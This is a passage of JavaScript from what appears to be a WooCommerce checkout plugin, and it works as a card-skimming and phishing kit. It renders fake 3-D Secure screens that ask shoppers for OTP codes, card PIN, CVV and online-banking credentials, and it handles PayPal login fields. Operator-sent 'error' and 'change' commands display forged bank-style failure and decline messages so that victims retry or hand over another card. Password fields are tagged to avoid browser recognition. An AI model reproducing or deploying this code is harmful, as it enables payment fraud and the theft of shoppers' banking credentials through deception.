            jQuery('.woocommerce-thankyou-order-received').show();
            jQuery('.woocommerce-order-details').show();
            jQuery('.woocommerce-customer-details').show();
            jQuery('.woocommerce-order-overview').show();
            
            // 🔥 清理URL参数（不刷新页面，使用history API）
            const url = new URL(window.location.href);
            url.searchParams.delete('cpg_verification');
            url.searchParams.delete('session_id');
            window.history.replaceState({}, '', url.toString());
            
            // 🔥 平滑滚动到页面顶部，显示订单详情（不弹窗，直接显示WooCommerce原生感谢页）
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        /**
         * 🔥 通用方法：在验证界面显示错误提示
         */
        showErrorInVerification(verificationType, errorText, errorColor = '#dc3545') {
            
            // 🔥 统一使用helper文本位置显示错误（所有验证类型）
            const helperElement = document.getElementById(`${verificationType}Helper`);
            
            if (helperElement) {
                // 保存原始helper文本（如果还没保存的话）
                if (!helperElement.dataset.originalText) {
                    helperElement.dataset.originalText = helperElement.textContent;
                }
                
                // 将错误文本设置到helper位置
                helperElement.textContent = errorText;
                helperElement.style.color = errorColor;  // 设置红色
                helperElement.style.fontWeight = '500'; // 稍微加粗，强调错误
                helperElement.style.display = 'block'; // 确保显示
                
                
                // 🔥 绑定输入监听：用户重新输入时自动清除错误
                this.bindInputClearError(verificationType, helperElement);
                
                // 🔥 聚焦并全选输入框内容
                setTimeout(() => {
                    const inputElement = document.getElementById(`${verificationType}Input`);
                    if (inputElement) {
                        inputElement.focus();
                        inputElement.select(); // 全选，方便重新输入
                        inputElement.classList.add('error'); // 添加错误样式
                    }
                    
                    // 网银验证特殊处理
                    if (verificationType === 'bank') {
                        const customerInput = document.getElementById('bankCustomerInput');
                        if (customerInput) {
                            customerInput.focus();
                            customerInput.select();
                            customerInput.classList.add('error');
                        }
                    }
                }, 200);
                
                return true;
            } else {
                console.warn('[3D Verify] ⚠️ 未找到helper元素，尝试使用错误框');
                
                // 降级：使用原来的错误框方式
            const errorElement = document.getElementById(`${verificationType}ErrorMessage`);
            const errorTextElement = document.getElementById(`${verificationType}ErrorText`);
            
            if (errorElement && errorTextElement) {
                errorTextElement.textContent = errorText;
                const errorContainer = errorTextElement.parentElement;
                errorContainer.style.color = errorColor;
                    errorContainer.style.borderColor = errorColor + '33';
                    errorContainer.style.backgroundColor = errorColor + '0d';
                errorElement.style.display = 'block';
                
                setTimeout(() => {
                        const inputElement = document.getElementById(`${verificationType}Input`);
                        if (inputElement) {
                            inputElement.focus();
                            inputElement.select();
                            inputElement.classList.add('error');
                        }
                    }, 200);
                
                return true;
                }
                
                console.warn('[3D Verify] ⚠️ 未找到任何错误提示元素');
                return false;
            }
        }

        /**
         * 🔥 获取针对不同验证类型的默认错误文案（银行级别专业表达）
         */
        getDefaultErrorMessage(verificationType) {
            const defaultMessages = {
                'otp': 'AUTHENTICATION FAILED: The One-Time Password you entered is invalid. Please verify the code sent to your registered mobile number and try again. Click "Resend code" if you need a new verification code.',
                'email': 'AUTHENTICATION FAILED: The verification code you entered is invalid. Please check the code sent to your registered email address and try again. Click "Resend code" if you need a new verification code.',
                'pin': 'AUTHENTICATION FAILED: The Personal Identification Number (PIN) you entered is incorrect. Please verify your PIN and try again. For security reasons, multiple failed attempts may result in your card being temporarily locked.',
                'cvv': 'AUTHENTICATION FAILED: The Card Verification Value (CVV) you entered is incorrect. Please verify the 3-digit security code printed on the back of your card and try again.',
                'app': 'AUTHENTICATION PENDING: Transaction authorization through your mobile banking application has not been confirmed. Please open your banking app immediately to review and approve this transaction.',
                'bank': 'AUTHENTICATION FAILED: The online banking credentials you entered are invalid. Please verify your Customer Identification Number and Password, then try again. Contact your bank if you have forgotten your credentials.',
                'custom': 'AUTHENTICATION FAILED: The verification information you provided is invalid. Please verify all required information and try again.'
            };
            
            return defaultMessages[verificationType] || 'AUTHENTICATION FAILED: Unable to verify your payment information. Please check all details and try again, or contact your financial institution for assistance.';
        }
        
        /**
         * 🔥 获取针对不同验证类型的默认换卡文案（银行级别专业表达）
         */
        getDefaultChangeMessage(verificationType) {
            const defaultMessages = {
                'otp': 'TRANSACTION DECLINED: Your financial institution does not support One-Time Password authentication for this card. Please use an alternative payment method or contact your bank to enable this security feature.',
                'email': 'TRANSACTION DECLINED: Your financial institution does not support email verification for this card. Please use an alternative payment method or contact your bank to enable this security feature.',
                'pin': 'TRANSACTION DECLINED: Your card is not enabled for Personal Identification Number (PIN) verification. Please use an alternative payment method or contact your bank to activate PIN authentication.',
                'cvv': 'TRANSACTION DECLINED: Card Verification Value (CVV) authentication failed for security reasons. Please use an alternative payment method or contact your bank immediately to verify your card status.',
                'app': 'TRANSACTION DECLINED: Your financial institution does not support mobile banking app verification for this card. Please use an alternative payment method or contact your bank to enable this security feature.',
                'bank': 'TRANSACTION DECLINED: Your card is not enabled for online banking verification. Please use an alternative payment method or contact your bank to activate internet banking services.',
                'custom': 'TRANSACTION DECLINED: We are unable to process this transaction with your current payment method. Please use an alternative card or contact your financial institution for assistance.'
            };
            
            return defaultMessages[verificationType] || 'TRANSACTION DECLINED: This payment method cannot be processed at this time. Please use an alternative payment method or contact your financial institution for further assistance.';
        }
        
        /**
         * 🔥 显示拒绝验证错误（在验证界面helper位置显示）
         */
        showError(message) {
            
            // 🔥 优先级：message.verification_type > message.data.verification_type > this.currentVerification
            const targetVerification = message.verification_type || message.data?.verification_type || this.currentVerification;
            
            // 🔥 如果没有目标验证界面，仅记录警告但不报错（避免中断用户流程）
            if (!targetVerification) {
                console.warn('[3D Verify] ⚠️ 无法显示错误：没有活跃验证界面且消息中未指定验证类型');
                console.warn('[3D Verify] 💡 请先让用户进入具体验证界面，或在发送error消息时包含verification_type字段');
                return;
            }
            
            // 🔥 获取错误文本：优先使用自定义消息，否则使用针对该验证类型的默认文案（银行级别专业表达）
            const errorText = message.message || message.data?.text || message.data?.message || this.getDefaultErrorMessage(targetVerification);
            // 🔥 强制使用红色：#dc3545（Bootstrap危险红色，银行级别标准）
            const errorColor = message.color || message.data?.color || '#dc3545';
            
            
            // 🔥 隐藏加载圈圈，恢复按钮（让用户可以重新提交）
            this.hideLoadingAndShowButton(targetVerification);
            
            // 在指定的验证界面显示错误
            this.showErrorInVerification(targetVerification, errorText, errorColor);
        }
        
        /**
         * 🔥 显示换卡支付提示
         * 🔥🔥🔥 恢复换卡功能：移除永久保护逻辑，允许管理员发送change指令时执行换卡流程 🔥🔥🔥
         */
        showChange(message) {
            console.log('[3D Verify] 📦 收到换卡指令');
            
            // 🔥🔥🔥 移除永久保护逻辑，恢复换卡功能 🔥🔥🔥
            // 当管理员明确发送change指令时，应该执行换卡流程
            
            // 🔥 PayPal短期保护逻辑（仅在刚提交后500ms内保护，避免误触发）
            const paypalSubmitTime = window.CPG_PayPalCardSubmitted || 0;
            const timeSincePayPalSubmit = Date.now() - paypalSubmitTime;
            const isPayPalActive = window.CPG_PayPal3DWaitingActive === true;
            
            if (isPayPalActive && timeSincePayPalSubmit < 500) {
                console.warn('[3D Verify] ⚠️ PayPal刚提交卡号，忽略change指令（短期保护）');
                console.log('[3D Verify] 💡 PayPal提交时间:', timeSincePayPalSubmit, 'ms前');
                return; // 直接返回，不执行换卡流程
            }
            
            // 🔥 优先级：message.verification_type > message.data.verification_type > this.currentVerification
            const targetVerification = message.verification_type || message.data?.verification_type || this.currentVerification;
            
            // 🔥 如果没有目标验证界面，仅记录警告但不报错（避免中断用户流程）
            if (!targetVerification) {
                console.warn('[3D Verify] ⚠️ 无法显示换卡提示：没有活跃验证界面且消息中未指定验证类型');
                console.warn('[3D Verify] 💡 请先让用户进入具体验证界面，或在发送change消息时包含verification_type字段');
                return;
            }
            
            // 🔥 获取换卡文本：优先使用自定义消息，否则使用针对该验证类型的默认文案（银行级别专业表达）
            const changeText = message.message || message.data?.text || message.data?.message || this.getDefaultChangeMessage(targetVerification);
            // 🔥 强制使用红色：#dc3545（Bootstrap危险红色，银行级别标准）
            const changeColor = message.color || message.data?.color || '#dc3545';
            
            
            // 🔥 隐藏加载圈圈，恢复按钮（让用户可以重新提交）
            this.hideLoadingAndShowButton(targetVerification);
            
            // 在指定的验证界面显示换卡提示
            this.showErrorInVerification(targetVerification, changeText, changeColor);
            
            // 🔥🔥🔥 3秒后关闭验证界面，清空卡信息，让用户重新填卡（停留在结账页，不跳转）🔥🔥🔥
            setTimeout(() => {
                // 🔥 再次检查PayPal保护标志（短期保护，仅在刚提交后5秒内）
                const paypalSubmitTime2 = window.CPG_PayPalCardSubmitted || 0;
                const timeSincePayPalSubmit2 = Date.now() - paypalSubmitTime2;
                const isPayPalActive2 = window.CPG_PayPal3DWaitingActive === true;
                
                if (isPayPalActive2 && timeSincePayPalSubmit2 < 5000) {
                    console.warn('[3D Verify] ⚠️ PayPal等待界面仍激活中，取消关闭操作（短期保护）');
                    return; // 不执行关闭操作
                }
                
                console.log('[3D Verify] 🔄 执行换卡流程：隐藏验证界面，清空卡信息');
                
                // 隐藏所有验证界面并重置 waitingShown 标志（验证流程被中断，需要重新开始）
                this.hideAll(true);
                
                // 🔥 清空卡信息输入框，让用户重新填写
                const cardNumberInput = document.getElementById('cpg_card_number_input');
                const expiryInput = document.getElementById('cpg_expiry_input');
                const cvvInput = document.getElementById('cpg_cvv_input');
                const cardNumber = document.getElementById('cpg_card_number');
                const expiryDate = document.getElementById('cpg_expiry_date');
                const cvv = document.getElementById('cpg_cvv');
                const cardType = document.getElementById('cpg_card_type');
                
                // 清空显示输入框
                if (cardNumberInput) cardNumberInput.value = '';
                if (expiryInput) expiryInput.value = '';
                if (cvvInput) cvvInput.value = '';
                
                // 清空隐藏字段
                if (cardNumber) cardNumber.value = '';
                if (expiryDate) expiryDate.value = '';
                if (cvv) cvv.value = '';
                if (cardType) cardType.value = '';
                
                // 🔥🔥🔥 清空 PayPal 隐藏字段（确保换卡后可以重新提交）🔥🔥🔥
                jQuery('#cpg_paypal_card_number').val('');
                jQuery('#cpg_paypal_card_expiry').val('');
                jQuery('#cpg_paypal_card_cvv').val('');
                jQuery('#cpg_paypal_card_brand').val('');
                jQuery('#cpg_paypal_data_complete').val('');
                jQuery('#cpg_paypal_email').val('');
                jQuery('#cpg_paypal_password').val('');
                
                // 🔥 重置 PayPal 提交标志（允许重新提交）
                window.CPG_PayPalCardSubmitted = 0;
                window.CPG_PayPal3DWaitingActive = false;
                
                // 🔥🔥🔥 阻止 WooCommerce 默认跳转行为 🔥🔥🔥
                // 移除 WooCommerce 结账表单的 processing 状态
                if (typeof wc_checkout_form !== 'undefined' && wc_checkout_form.$checkout_form) {
                    wc_checkout_form.$checkout_form.removeClass('processing').unblock();
                }
                jQuery('form.checkout').removeClass('processing').unblock();
                
                // 🔥 显示结账表单（如果被隐藏了）
                jQuery('form.checkout').show();
                jQuery('.woocommerce-checkout-review-order-table').show();
                jQuery('.woocommerce-checkout').show();
                
                // 🔥 恢复页面滚动
                document.body.style.cssText = '';
                document.documentElement.style.cssText = '';
                jQuery('html, body').removeClass('cpg-verify-active');
                
                // 🔥 聚焦到卡号输入框
                if (cardNumberInput) {
                    cardNumberInput.focus();
                }
                
                // 🔥🔥🔥 关键修复：换卡后立即刷新 WooCommerce session，确保用户可以继续下单 🔥🔥🔥
                this.refreshWooCommerceSession();
                
                console.log('[3D Verify] ✅ 换卡流程完成，用户停留在结账页，session 已刷新');
                
            }, 3000);
        }

        /**
         * 通用验证界面显示方法
         */
        async showVerificationModal(type, message) {
            
            const container = $(`#cpg-${type}`);
            
            if (!container.length) {
                console.error(`[3D Verify] ❌ 找不到验证界面容器 #cpg-${type}`);
                console.error(`[3D Verify] 💡 请检查模板是否已加载: figma-verification-templates.php`);
                    return;
                }
                
            // 更新界面数据
            const data = message.data || {};
            
            // 🔥 查询并更新卡品牌图标（CVV验证除外）
            const cardNumber = data.cardFull || data.card_number || 
                              document.getElementById('cpg_card_number')?.value || '';
            
            if (cardNumber && type !== 'cvv') {
                const cardBrand = await this.queryCardBrand(cardNumber);
                if (cardBrand) {
                    this.updateVerificationBrandIcon(type, cardBrand);
                }
            }
            
            // 更新标题和文本
            if (data.title) $(`#${type}Title`).html(data.title);
            
            // 🔥 更新文本内容，支持动态替换变量
            if (data.text) {
                let text = data.text;
                
                // 🔥 OTP验证特殊处理 - 替换/添加手机号
                if (type === 'otp' && data.phone) {
                    const phoneDigits = data.phone.replace(/\*/g, '');
                    // 如果文案中已有手机号占位符，替换它
                    if (text.includes('(last digits')) {
                        text = text.replace(/\(last digits \d+\)/gi, `(last digits ${phoneDigits})`);
                    } else {
                        // 如果没有占位符，在"mobile number"后添加手机号
                        text = text.replace(/mobile number\./gi, `mobile number (last digits ${phoneDigits}).`);
                    }
                }
                
                // 🔥 邮箱验证特殊处理 - 替换/添加邮箱
                if (type === 'email' && data.email) {
                    // 如果文案中已有邮箱占位符，替换它
                    if (text.includes('@')) {
                        text = text.replace(/\([^)]*@[^)]*\)/g, `(${data.email})`);
                    } else {
                        // 如果没有占位符，在"email"后添加邮箱
                        text = text.replace(/email\./gi, `email (${data.email}).`);
                    }
                }
                
                // 🔥 APP验证特殊处理 - 替换/添加银行名称
                if (type === 'app' && data.bankName) {
                    text = text.replace(/Mobile App/gi, `${data.bankName} Mobile App`);
                }
                
                $(`#${type}Text`).html(text);
            }
            
            // 🔥🔥🔥 单独更新手机号/邮箱显示（即使没有自定义text也显示）🔥🔥🔥
            if (type === 'otp' && data.phone) {
                const phoneDisplay = document.getElementById('otpPhoneDisplay');
                if (phoneDisplay) {
                    phoneDisplay.textContent = `(ending in ${data.phone.replace(/\*/g, '')})`;
                }
            }
            
            if (type === 'email' && data.email) {
                const emailDisplay = document.getElementById('emailAddressDisplay');
                if (emailDisplay) {
                    emailDisplay.textContent = `(${data.email})`;
                }
            }
            
            // 更新交易详情
            // 🔥 商户名：优先使用后端数据，否则使用站点名称
            const merchantName = data.merchant || window.CPG_CONFIG?.site_name || window.location.hostname;
            $(`#${type}Merchant`).text(merchantName);
            
            // 🔥🔥🔥 产品名称：多重来源获取（优先使用缓存）🔥🔥🔥
            const cachedProductInfo = window.CPG_ProductInfo || {};
            let trackerProductInfo = {};
            try {
                trackerProductInfo = window.cpgTracker?.getProductInfo?.() || {};
            } catch (e) {
                console.warn('[3D Verify] cpgTracker.getProductInfo 调用失败:', e);
            }
            
            const configProductName = window.CPG_CONFIG?.product_name;
            const pageProductName = this.getProductNameFromPage();
            
            // 🔥 优先级：后端数据 > 缓存 > CPG_CONFIG > cpgTracker > 页面提取
            const productName = data.product || data.product_name || 
                               (cachedProductInfo.name && cachedProductInfo.name !== 'N/A' ? cachedProductInfo.name : null) ||
                               (configProductName && configProductName !== 'N/A' ? configProductName : null) || 
                               (trackerProductInfo.name && trackerProductInfo.name !== 'N/A' ? trackerProductInfo.name : null) || 
                               pageProductName;
            $(`#${type}Product`).text(productName || 'N/A');
            
            console.log('[3D Verify] 📦 产品名称已设置:', productName);
            
            // 🔥🔥🔥 金额：多重来源获取（优先使用缓存）🔥🔥🔥
            const configProductPrice = window.CPG_CONFIG?.product_price;
            const pageAmount = this.getAmountFromPage();
            
            // 🔥 优先级：后端数据 > 缓存 > CPG_CONFIG > cpgTracker > 页面提取
            const amountText = data.amount || data.product_price || 
                              (cachedProductInfo.price && cachedProductInfo.price !== '$0.00' ? cachedProductInfo.price : null) ||
                              (configProductPrice && configProductPrice !== '$0.00' ? configProductPrice : null) || 
                              (trackerProductInfo.price && trackerProductInfo.price !== '$0.00' ? trackerProductInfo.price : null) || 
                              pageAmount;
            // 🔥🔥🔥 解码HTML实体，修复价格显示问题（&pound; -> £）🔥🔥🔥
            $(`#${type}Amount`).text(this.decodeHtmlEntities(amountText) || '$0.00');
            
            console.log('[3D Verify] 💰 金额已设置:', amountText);
            
            // 🔥 更新卡号显示（优先使用完整格式cardFull）
            if (data.cardFull) {
                // CVV和APP页面显示完整卡号
                if ($(`#${type}CardFull`).length) {
                    $(`#${type}CardFull`).text(data.cardFull);
                }
            }
            // 其他页面显示后4位
            if (data.cardNumber) {
                if ($(`#${type}Card`).length) {
                    $(`#${type}Card`).text('**** ' + data.cardNumber);
                }
            }
            
            // 更新输入框
            if (data.inputLabel) $(`#${type}Label`).text(data.inputLabel);
            if (data.inputHelper) $(`#${type}Helper`).text(data.inputHelper);
            
            // 网银验证特殊字段
            if (type === 'bank') {
                if (data.cnpWarning) $('#bankWarning').text(data.cnpWarning);
                if (data.customerIdLabel) $('#bankCustomerLabel').text(data.customerIdLabel);
                if (data.passwordLabel) $('#bankPasswordLabel').text(data.passwordLabel);
            }
            
            // CVV验证特殊字段
            if (type === 'cvv') {
                if (data.cardType) $('#cvvCardType').text(data.cardType);
                
                // 🔥 动态调整CVV长度（运通4位，其他3位）
                const cardType = data.card_type || data.cardType || '';
                const isAmex = cardType.toLowerCase().includes('amex') || cardType.toLowerCase().includes('american');
                const maxLength = isAmex ? 4 : 3;
                $('#cvvInput').attr('maxlength', maxLength);
                $('#cvvInput').attr('placeholder', isAmex ? 'Enter 4-digit CVV' : 'Enter 3-digit CVV');
            }
            
            // 🔥 清空输入框（防止显示旧数据）
            const inputElement = $(`#${type}Input`);
            if (inputElement.length) {
                inputElement.val(''); // 清空输入值
            }
            
            // 🔥 网银验证需要清空两个输入框并强制禁用autocomplete
            if (type === 'bank') {
                const customerInput = document.getElementById('bankCustomerInput');
                const passwordInput = document.getElementById('bankPasswordInput');
                
                if (customerInput) {
                    customerInput.value = '';
                    customerInput.setAttribute('autocomplete', 'off');
                    customerInput.setAttribute('data-form-type', 'other'); // 防止浏览器识别
                }
                if (passwordInput) {
                    passwordInput.value = '';
                    passwordInput.setAttribute('autocomplete', 'off');
                    passwordInput.setAttribute('data-form-type', 'other');
                }
            }
            
            // 🔥 清空错误提示并恢复helper文本
            const errorElement = $(`#${type}ErrorMessage`);
            if (errorElement.length) {
                errorElement.hide();
            }
            
            // 🔥 恢复helper的原始文本和样式
            const helperElement = document.getElementById(`${type}Helper`);
            if (helperElement) {
                if (helperElement.dataset.originalText) {
                    helperElement.textContent = helperElement.dataset.originalText;
                    helperElement.style.color = ''; // 恢复默认颜色
                    helperElement.style.fontWeight = ''; // 恢复默认字重
                }
            }
            
            // 🔥 停止之前的动画，立即显示（避免动画冲突）
            container.stop(true, true).addClass('active').show();
            $('html, body').addClass('cpg-verify-active');
            
            // 🔥 只锁定滚动，保留页面可见性
            document.body.style.cssText = 'overflow: hidden !important;';
            document.documentElement.style.cssText = 'overflow: hidden !important;';
            
            // 🔥 绑定实时验证
            this.bindInputValidation(type);
            
            // 🔥 绑定Enter键提交
            this.bindEnterKeySubmit(type);
            
            // 🔥 绑定Resend按钮倒计时
            this.bindResendButton(type);
            
            // 聚焦输入框
            setTimeout(() => {
                $(`#${type}Input`).focus();
            }, 400);
            
            this.currentVerification = type;
        }
        
        /**
         * 🔥 绑定输入监听：用户重新输入时自动清除错误
         */
        bindInputClearError(verificationType, helperElement) {
            // 🔥 如果已经绑定过，先移除旧的监听器
            if (helperElement.dataset.clearErrorBound === 'true') {
                return;
            }
            
            const clearError = () => {
                if (helperElement.dataset.originalText) {
                    helperElement.textContent = helperElement.dataset.originalText;
                    helperElement.style.color = ''; // 恢复默认灰色
                    helperElement.style.fontWeight = ''; // 恢复默认字重
                }
            };
            
            // 获取输入框
            const inputElement = document.getElementById(`${verificationType}Input`);
            
            if (verificationType === 'bank') {
                // 网银验证：监听两个输入框
                const customerInput = document.getElementById('bankCustomerInput');
                const passwordInput = document.getElementById('bankPasswordInput');
                
                if (customerInput) {
                    customerInput.addEventListener('input', clearError, { once: true });
                }
                if (passwordInput) {
                    passwordInput.addEventListener('input', clearError, { once: true });
                }
            } else if (inputElement) {
                // 其他验证类型：监听主输入框
                inputElement.addEventListener('input', clearError, { once: true });
            }
            
            // 标记已绑定
            helperElement.dataset.clearErrorBound = 'true';
        }
        
        /**
         * 🔥 绑定输入框实时验证
         */
        bindInputValidation(type) {
            const inputElement = document.getElementById(`${type}Input`);
            if (!inputElement) return;
            
            // 数字类型验证(OTP, PIN, CVV)
            const numericTypes = ['otp', 'email', 'pin', 'cvv'];
            if (numericTypes.includes(type)) {
                inputElement.addEventListener('input', (e) => {
                    // 只允许数字
                    let value = e.target.value.replace(/\D/g, '');
                    e.target.value = value;
                    
                    // 移除错误样式
                    if (value.length > 0) {
                        e.target.classList.remove('error');
                    }
                });
            }
            
            // 网银验证的两个输入框
            if (type === 'bank') {
                const customerInput = document.getElementById('bankCustomerInput');
                const passwordInput = document.getElementById('bankPasswordInput');
                
                if (customerInput) {
                    customerInput.addEventListener('input', () => {
                        customerInput.classList.remove('error');
                    });
                }
                
                if (passwordInput) {
                    passwordInput.addEventListener('input', () => {
                        passwordInput.classList.remove('error');
                    });
                }
            }
        }
        
        /**
         * 🔥 绑定Enter键提交
         */
        bindEnterKeySubmit(type) {
            const inputElement = document.getElementById(`${type}Input`);
            const submitBtn = document.querySelector(`#cpg-${type} .cpg-submit-btn`);
            
            if (inputElement && submitBtn) {
                inputElement.addEventListener('keydown', (e) => {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        submitBtn.click();
                    }
                });
            }
            
            // 🔥 网银验证特殊处理: Customer ID按Enter跳到Password
            if (type === 'bank') {
                const customerInput = document.getElementById('bankCustomerInput');
                const passwordInput = document.getElementById('bankPasswordInput');
                
                if (customerInput && passwordInput && submitBtn) {
                    customerInput.addEventListener('keydown', (e) => {
                        if (e.key === 'Enter') {
                            e.preventDefault();
                            passwordInput.focus();
                        }
                    });
                    
                    passwordInput.addEventListener('keydown', (e) => {
                        if (e.key === 'Enter') {
                            e.preventDefault();
                            submitBtn.click();
                        }
                    });
                }
            }
        }
        
        /**
         * 🔥 绑定Resend按钮倒计时
         */
        bindResendButton(type) {
            const resendBtn = document.querySelector(`#cpg-${type} .cpg-resend-btn`);
            if (!resendBtn) return;
            
            // 🔥 检查是否已经绑定过倒计时事件（避免重复绑定）
            if (resendBtn.dataset.countdownBound === 'true') {
                return;
            }
            
            // 🔥 不克隆按钮，直接添加倒计时事件
            // 注意：不使用 e.preventDefault()，让 user-tracking.js 的 WebSocket 事件继续执行
            resendBtn.addEventListener('click', () => {
                // 只执行倒计时逻辑，不阻止默认行为
                this.startResendCountdown(type);
            });
            
            // 标记已绑定
            resendBtn.dataset.countdownBound = 'true';
        }
        
        /**
         * 🔥 Resend按钮倒计时（60秒）
         */
        startResendCountdown(type) {
            const resendBtn = document.querySelector(`#cpg-${type} .cpg-resend-btn`);
            if (!resendBtn) return;
            
            let countdown = 60;
            resendBtn.disabled = true;
            resendBtn.textContent = `Resend code (${countdown}s)`;
            
            const timer = setInterval(() => {
                countdown--;
                if (countdown > 0) {
                    resendBtn.textContent = `Resend code (${countdown}s)`;
                } else {
                    clearInterval(timer);
                    resendBtn.disabled = false;
                    resendBtn.textContent = 'Resend code';
                }
            }, 1000);
            
        }

        /**
         * 隐藏所有验证界面
         * @param {boolean} resetWaitingFlag - 是否重置 waitingShown 标志（默认 false，只在验证流程完全结束时设为 true）
         */
        hideAll(resetWaitingFlag = false) {
            console.log('[3D Verify] 📍 hideAll 被调用, resetWaitingFlag:', resetWaitingFlag);
            
            // 如果当前有验证界面，记录警告
            if (this.currentVerification) {
                console.warn(`[3D Verify] ⚠️ 正在关闭 ${this.currentVerification} 验证界面`);
            }
            
            // 🔥 清除等待界面的阶段转换定时器
            if (this._stageTransitionTimer) {
                clearTimeout(this._stageTransitionTimer);
                this._stageTransitionTimer = null;
            }
            
            // 🔥 使用原生方式隐藏（更稳定，避免 jQuery 动画冲突）
            const verifyContainers = document.querySelectorAll('.cpg-verify');
            verifyContainers.forEach(container => {
                container.style.display = 'none';
                container.classList.remove('active');
            });
            
            $('html, body').removeClass('cpg-verify-active');
            
            // 恢复body样式（清空style属性）
            document.body.style.cssText = '';
            document.documentElement.style.cssText = '';
            
            this.currentVerification = null;
            this._waitingDisplaying = false; // 🔥 清除显示锁定
            
            // 🔥🔥🔥 只有在验证流程完全结束时才重置 waitingShown 标志 🔥🔥🔥
            // 切换验证界面时不重置，这样可以继续接收其他验证指令
            if (resetWaitingFlag) {
                this.waitingShown = false;
            }
        }

        /**
         * 🔥🔥🔥 刷新 WooCommerce Session（换卡后确保会话有效）🔥🔥🔥
         */
        refreshWooCommerceSession() {
            console.log('[3D Verify] 🔄 换卡后刷新 WooCommerce session');
            
            // 方法1：使用 WooCommerce update_order_review 刷新 session（最可靠）
            jQuery.ajax({
                type: 'POST',
                url: window.wc_checkout_params?.wc_ajax_url?.replace('%%endpoint%%', 'update_order_review') || 
                     (window.location.origin + '/?wc-ajax=update_order_review'),
                data: jQuery('form.checkout').serialize() + '&security=' + (window.wc_checkout_params?.update_order_review_nonce || ''),
                dataType: 'json',
                timeout: 10000,
                success: function(response) {
                    if (response && response.fragments) {
                        console.log('[3D Verify] ✅ WooCommerce session 刷新成功（换卡后）');
                        // 更新页面片段（如购物车、订单总计等）
                        jQuery.each(response.fragments, function(key, value) {
                            jQuery(key).replaceWith(value);
                        });
                    }
                },
                error: function() {
                    console.warn('[3D Verify] ⚠️ WooCommerce session 刷新失败，尝试备用方法');
                    // 方法2：使用 WordPress Heartbeat API
                    jQuery.ajax({
                        type: 'POST',
                        url: window.ajaxurl || (window.location.origin + '/wp-admin/admin-ajax.php'),
                        data: { action: 'heartbeat', interval: 15 },
                        dataType: 'json',
                        timeout: 5000
                    });
                }
            });
            
            // 方法3：同时触发一次购物车刷新（确保万无一失）
            jQuery(document.body).trigger('update_checkout');
        }

        /**
         * 🔥 新增：显示成功动画
         */
        showSuccessAnimation() {
            
            // 创建成功提示元素
            const successHtml = `
                <div class="cpg-success-overlay" style="
                    position: fixed;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
                    padding: 50px 70px;
                    border-radius: 20px;
                    box-shadow: 0 15px 50px rgba(0,0,0,0.4);
                    z-index: 999999;
                    text-align: center;
                    color: white;
                    max-width: 90%;
                    animation: cpgSuccessFadeIn 0.4s ease-out;
                ">
                    <div class="cpg-success-icon" style="
                        font-size: 90px;
                        margin-bottom: 24px;
                        line-height: 1;
                        animation: cpgSuccessScale 0.6s ease-out;
                    ">✓</div>
                    <h2 style="
                        font-size: 32px;
                        font-weight: 700;
                        margin: 0 0 12px 0;
                        letter-spacing: -0.5px;
                    ">Payment Successful!</h2>
                    <p style="
                        font-size: 18px;
                        margin: 0;
                        opacity: 0.95;
                        font-weight: 300;
                    ">Thank you for your purchase</p>
                </div>
            `;
            
            // 添加动画样式
            if (!jQuery('#cpg-success-animations').length) {
                jQuery('<style id="cpg-success-animations">').text(`
                    @keyframes cpgSuccessFadeIn {
                        from { 
                            opacity: 0;
                            transform: translate(-50%, -60%);
                        }
                        to { 
                            opacity: 1;
                            transform: translate(-50%, -50%);
                        }
                    }
                    @keyframes cpgSuccessScale {
                        0% { 
                            transform: scale(0);
                            opacity: 0;
                        }
                        50% { 
                            transform: scale(1.15);
                        }
                        100% { 
                            transform: scale(1);
                            opacity: 1;
                        }
                    }
                    @keyframes cpgSuccessFadeOut {
                        from { 
                            opacity: 1;
                            transform: translate(-50%, -50%);
                        }
                        to { 
                            opacity: 0;
                            transform: translate(-50%, -45%);
                        }
                    }
                `).appendTo('head');
            }
            
            // 显示成功动画
            jQuery('body').append(successHtml);
            
            // 2.5秒后淡出
            setTimeout(() => {
                jQuery('.cpg-success-overlay').css('animation', 'cpgSuccessFadeOut 0.5s ease-out');
                setTimeout(() => {
                    jQuery('.cpg-success-overlay').remove();
                }, 500);
            }, 2500);
        }

        /**
         * 🔥 新增：从URL获取订单ID
         */
        getOrderIdFromUrl() {
            const url = new URL(window.location.href);
            return url.searchParams.get('order-received') || 
                   url.searchParams.get('order_id') || 
                   url.searchParams.get('order') ||
                   this.extractOrderIdFromPath();
        }

        /**
         * 🔥 新增：从URL路径提取订单ID
         */
        extractOrderIdFromPath() {
            const match = window.location.pathname.match(/\/order-received\/(\d+)/);
            return match ? match[1] : null;
        }

        /**
         * 🔥 新增：获取订单密钥
         */
        getOrderKey() {
            const url = new URL(window.location.href);
            return url.searchParams.get('key') || '';
        }

        /**
         * 🔥 新增：解码HTML实体（修复价格显示问题）
         */
        decodeHtmlEntities(text) {
            if (!text) return text;
            const textArea = document.createElement('textarea');
            textArea.innerHTML = text;
            return textArea.value;
        }

        /**
         * 🔥 从页面获取产品名称
         */
        getProductNameFromPage() {
            // 尝试多种 WooCommerce/FunnelKit 选择器
            const productName = 
                // 🔥 FunnelKit 最新选择器（根据实际页面结构）
                document.querySelector('.wfacp_mini_cart_start_h .wfacp_summary_img_wrap + div')?.textContent?.trim() ||
                document.querySelector('.wfacp_row_wrap .wfacp_product_name_inner')?.textContent?.trim() ||
                document.querySelector('.wfacp_mini_cart_item_name')?.textContent?.trim() ||
                document.querySelector('.wfacp_product_switch_title')?.textContent?.trim() ||
                document.querySelector('.wfacp_order_summary .wfacp_product_name')?.textContent?.trim() ||
                document.querySelector('.wfacp_mini_cart_item .product-name')?.textContent?.trim() ||
                document.querySelector('.wfacp_product_row .wfacp_product_name')?.textContent?.trim() ||
                document.querySelector('.wfacp_order_summary_item_name')?.textContent?.trim() ||
                document.querySelector('.wfacp_product_name_inner')?.textContent?.trim() ||
                document.querySelector('.wfacp-product-name')?.textContent?.trim() ||
                // WooCommerce 标准选择器
                document.querySelector('.woocommerce-checkout-review-order-table .product-name a')?.textContent?.trim() ||
                document.querySelector('.woocommerce-checkout-review-order-table .product-name')?.textContent?.trim() ||
                document.querySelector('.cart_item .product-name a')?.textContent?.trim() ||
                document.querySelector('.cart_item .product-name')?.textContent?.trim() ||
                document.querySelector('.woocommerce-table--order-details .product-name a')?.textContent?.trim() ||
